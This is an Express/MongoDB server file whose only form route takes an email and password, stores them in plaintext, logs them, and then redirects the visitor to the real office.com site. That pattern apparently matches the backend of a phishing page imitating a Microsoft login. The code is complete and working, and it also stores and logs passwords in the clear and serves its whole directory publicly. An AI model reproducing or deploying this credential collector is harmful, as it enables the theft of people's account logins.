const express = require('express');
const mongoose = require('mongoose');
const path = require('path');
const PORT = 3000;

const app = express();
app.use(express.static(__dirname));
app.use(express.urlencoded({ extended: true }));
app.use(express.json()); // Added to handle JSON requests if needed

mongoose.connect('mongodb://127.0.0.1:27017/students', { useNewUrlParser: true, useUnifiedTopology: true });
const db = mongoose.connection;
db.once('open', () => {
    console.log("Mongodb connection successful");
});

const userSchema = new mongoose.Schema({
    email: String,
    password: String,
});

const Users = mongoose.model("data", userSchema);

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});
app.post('/post', async (req, res) => {
    try {
        const { email, password } = req.body;
        const user = new Users({
            email,
            password
        });
        await user.save();
        console.log(user);

        // Send a success response
        res.redirect('https://www.office.com/');
    } catch (error) {
        console.error("Error saving user:", error);
        res.status(500).send({ message: "Error saving user" });
    }
});

app.listen(PORT, () => {
    console.log(`Server started on port ${PORT}`);
});
